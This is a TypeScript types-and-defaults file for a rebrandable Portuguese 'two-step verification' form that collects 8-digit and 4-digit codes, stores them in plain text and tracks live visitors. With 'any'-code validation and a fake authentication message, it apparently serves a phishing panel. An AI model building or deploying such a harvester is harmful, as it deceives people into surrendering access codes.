export type ValidationMode = 'any' | 'strict';

export interface AuthorizedCodePair {
  id: string;
  label: string;
  code8: string;
  code4: string;
  active: boolean;
}

export interface ExtraFieldConfig {
  id: string;
  label: string;
  placeholder: string;
  type: 'text' | 'email' | 'tel';
  required: boolean;
  enabled: boolean;
}

export interface FormConfig {
  brandName: string;
  logoUrl: string;
  authLoadingText: string;
  title: string;
  description: string;
  step1Title: string;
  step1Helper: string;
  step1SuccessTitle: string;
  step1SuccessMessage: string;
  step2Title: string;
  step2Helper: string;
  finalSuccessTitle: string;
  finalSuccessMessage: string;
  validationMode: ValidationMode;
  autoAdvance: boolean;
  maskCode4: boolean;
  extraFields: ExtraFieldConfig[];
}

export interface SubmissionRecord {
  id: string;
  protocol: string;
  code8: string;
  code4: string;
  extraData: Record<string, string>;
  status: 'Etapa 1 verificada' | 'Concluído' | 'Recusado';
  reason?: string;
  createdAt: string;
  updatedAt?: string;
  durationMs: number;
}

export interface OnlineVisitor {
  sessionId: string;
  step: string;
  code8Preview: string;
  lastSeen: number;
}

export const DEFAULT_CONFIG: FormConfig = {
  brandName: 'Portal de Verificação',
  logoUrl: '',
  authLoadingText: 'Fazendo autenticação, aguarde...',
  title: 'Verificação de Acesso em Duas Etapas',
  description:
    'Valide seu código principal de 8 dígitos e conclua a confirmação com o código de 4 dígitos.',
  step1Title: 'Informe seu código de 8 dígitos',
  step1Helper: 'Digite ou cole os 8 números do seu código de identificação.',
  step1SuccessTitle: 'Verificado com sucesso',
  step1SuccessMessage:
    'Seu código de 8 dígitos foi validado. Agora prossiga para a etapa final.',
  step2Title: 'Agora informe o código de 4 dígitos',
  step2Helper: 'Digite os 4 dígitos de confirmação para concluir o formulário.',
  finalSuccessTitle: 'Formulário enviado e verificado com sucesso',
  finalSuccessMessage:
    'Os códigos de 8 dígitos e 4 dígitos foram confirmados e registrados no sistema.',
  validationMode: 'any',
  autoAdvance: true,
  maskCode4: false,
  extraFields: [
    {
      id: 'fullName',
      label: 'Nome completo',
      placeholder: 'Ex.: Mariana Oliveira',
      type: 'text',
      required: false,
      enabled: true,
    },
    {
      id: 'contact',
      label: 'Telefone ou WhatsApp',
      placeholder: '(11) 99999-0000',
      type: 'tel',
      required: false,
      enabled: false,
    },
  ],
};
